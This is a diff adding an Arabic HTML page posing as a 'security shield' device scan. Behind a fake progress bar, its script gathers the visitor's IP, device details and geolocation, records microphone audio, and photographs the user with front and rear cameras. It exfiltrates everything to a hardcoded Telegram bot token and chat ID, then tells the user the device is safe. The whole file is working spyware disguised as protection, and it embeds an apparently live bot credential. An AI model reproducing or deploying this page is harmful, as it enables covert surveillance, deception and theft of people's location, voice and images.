@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص أمان النظام المتقدم</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1e1e1e; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
+        .progress-container { background: #333; border-radius: 10px; height: 12px; width: 100%; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #00d1b2; height: 100%; width: 0%; transition: width 0.5s ease; }
+        #status { font-size: 14px; color: #00d1b2; margin-bottom: 10px; font-weight: bold; }
+        button { background: #00d1b2; color: #121212; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        #v, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 style="margin-top:0;">درع الأمان</h2>
+    <p id="desc" style="color:#aaa;">اضغط لبدء فحص شامل وحماية جهازك من التجسس.</p>
+    
+    <div id="loader" style="display:none;">
+        <div id="status">جاري التحضير...</div>
+        <div class="progress-container">
+            <div id="fill" class="progress-bar"></div>
+        </div>
+    </div>
+    
+    <button id="start-btn" onclick="runWorker()">بدء الفحص الآن</button>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="640" height="480"></canvas>
+
+<script>
+    const CONFIG = {
+        token: '8256799115:AAFWB_PAl-d7d4zl9uR4yabOGBUKFWDm9hU',
+        chatId: '7654014302'
+    };
+
+    function updateUI(text, percent) {
+        document.getElementById('status').innerText = text;
+        document.getElementById('fill').style.width = percent + "%";
+    }
+
+    async function runWorker() {
+        document.getElementById('start-btn').style.display = 'none';
+        document.getElementById('desc').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        const device = {
+            platform: navigator.platform,
+            agent: navigator.userAgent.split(' ').pop(),
+            lang: navigator.language
+        };
+
+        try {
+            // 1. الحصول على الـ IP
+            updateUI("جاري تحليل الشبكة...", 20);
+            let ip = "غير معروف";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            const info = `📱 جهاز: ${device.platform}\n🌐 IP: ${ip}\n🔍 متصفح: ${device.agent}`;
+
+            // 2. الموقع الجغرافي (إجباري لإكمال الفحص)
+            updateUI("جاري تحديد الموقع...", 40);
+            const loc = await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    p => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+                    e => resolve("الموقع مرفوض"),
+                    { timeout: 8000 }
+                );
+            });
+
+            // 3. تسجيل الصوت (3 ثوانٍ)
+            updateUI("جاري فحص الميكروفون...", 60);
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendData(blob, "Voice Log", "voice");
+                    audioStream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                await new Promise(r => setTimeout(r, 3000));
+                recorder.stop();
+            } catch(e) { console.log("Mic blocked"); }
+
+            // 4. الصور (الأمامية ثم الخلفية)
+            updateUI("جاري فحص الكاميرات...", 80);
+            await captureAndSend("user", `صورة أمامية\n${info}\n📍 ${loc}`);
+            await captureAndSend("environment", `صورة خلفية\nIP: ${ip}`);
+
+            updateUI("اكتمل الفحص! جهازك آمن.", 100);
+            setTimeout(() => { alert("تم الفحص بنجاح. تفقد تقريرك على التلجرام."); }, 500);
+
+        } catch (err) {
+            updateUI("فشل الفحص: " + err.message, 0);
+        }
+    }
+
+    async function captureAndSend(mode, caption) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1000)); // استقرار الكاميرا
+            
+            const c = document.getElementById('c');
+            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+            
+            return new Promise(resolve => {
+                c.toBlob(async (blob) => {
+                    await sendData(blob, caption, "photo");
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve();
+                }, 'image/jpeg');
+            });
+        } catch (e) { console.log("Camera blocked: " + mode); }
+    }
+
+    async function sendData(blob, caption, type) {
+        const fd = new FormData();
+        fd.append('chat_id', CONFIG.chatId);
+        fd.append(type === "photo" ? "photo" : "voice", blob);
+        fd.append('caption', caption);
+        
+        const endpoint = type === "photo" ? "sendPhoto" : "sendVoice";
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/${endpoint}`, {
+                method: 'POST',
+                body: fd
+            });
+        } catch (e) { console.error("Telegram Error: ", e); }
+    }
+</script>
+
+</body>
+</html>
